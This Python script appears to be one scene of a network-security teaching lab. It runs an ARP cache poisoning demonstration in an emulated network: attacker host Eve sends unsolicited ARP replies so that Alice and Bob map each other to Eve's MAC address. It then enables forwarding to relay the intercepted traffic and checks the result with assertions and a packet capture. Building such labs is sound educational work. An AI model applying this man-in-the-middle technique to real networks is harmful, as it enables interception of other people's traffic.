#!/usr/bin/env python3
"""Scene 2 — Basic ARP spoof: Eve sends unsolicited unicast is-at replies to both Alice and Bob (Jev is off)."""
import os
import runpy
import time

HERE = os.path.dirname(os.path.abspath(__file__))
ROOT = os.path.dirname(HERE)
PCAPS = os.path.join(ROOT, 'pcaps')
os.makedirs(PCAPS, exist_ok=True)
labup = runpy.run_path(os.path.join(ROOT, 'lab-up.py'))
net, lab, alice, bob, eve = labup['start']()

print('Scene 2 - Basic ARP spoof (unsolicited op=2 to both hosts, Jev OFF)')
print('  Alice', alice.IP(), alice.MAC())
print('  Bob  ', bob.IP(), bob.MAC())
print('  Eve  ', eve.IP(), eve.MAC())

print('\n[1] flush ARP caches')
lab.flush_arp(alice, bob, eve)
lab.dump_arp(alice, bob, eve)

print('\n[2] start capture -> pcaps/scene2.pcap')
lab.pcap_start(os.path.join(PCAPS, 'scene2.pcap'), alice, bob, eve)
try:
    print('\n[3] Alice ARPs for Bob, Bob ARPs for Alice (real MACs)')
    print('    Alice learned Bob is at', lab.get_mac(alice, bob.IP()))
    print('    Bob learned Alice is at', lab.get_mac(bob, alice.IP()))
    print('    caches before Eve:')
    lab.dump_arp(alice, bob)

    print('\n[4] Eve enables IPv4 forwarding to relay intercepted packets')
    lab.forward(eve, on=1)

    print('\n[5] Eve sends unsolicited opcode 2 replies:')
    print('    -> To Alice: 10.0.0.3 is at', eve.MAC())
    lab.spoof(eve, alice.IP(), bob.IP(), alice.MAC())
    print('    -> To Bob:   10.0.0.1 is at', eve.MAC())
    lab.spoof(eve, bob.IP(), alice.IP(), bob.MAC())
    time.sleep(0.2)
    print('    caches after Eve:')
    lab.dump_arp(alice, bob)

    alice_cache = lab.arp_table(alice)
    bob_cache = lab.arp_table(bob)
    assert alice_cache.get(bob.IP()) == eve.MAC().lower(), f'Alice not poisoned: {alice_cache}'
    assert bob_cache.get(alice.IP()) == eve.MAC().lower(), f'Bob not poisoned: {bob_cache}'

    print('\n[6] Alice pings Bob - ICMP echo is addressed to Eve\'s MAC (00:00:00:00:00:02)')
    lab.ping(alice, bob, count=1)

    print('\n[7] ARP caches after ping')
    lab.dump_arp(alice, bob, eve)
    print('\n[PASS] Scene 2: Both Alice and Bob map each other to Eve (00:00:00:00:00:02), and ICMP goes to Eve.')
finally:
    print('\n[8] stop capture')
    lab.pcap_stop()
    net.stop()
    print('\nScene 2 done. Open scene2.pcap in Wireshark (filter: arp || icmp)')
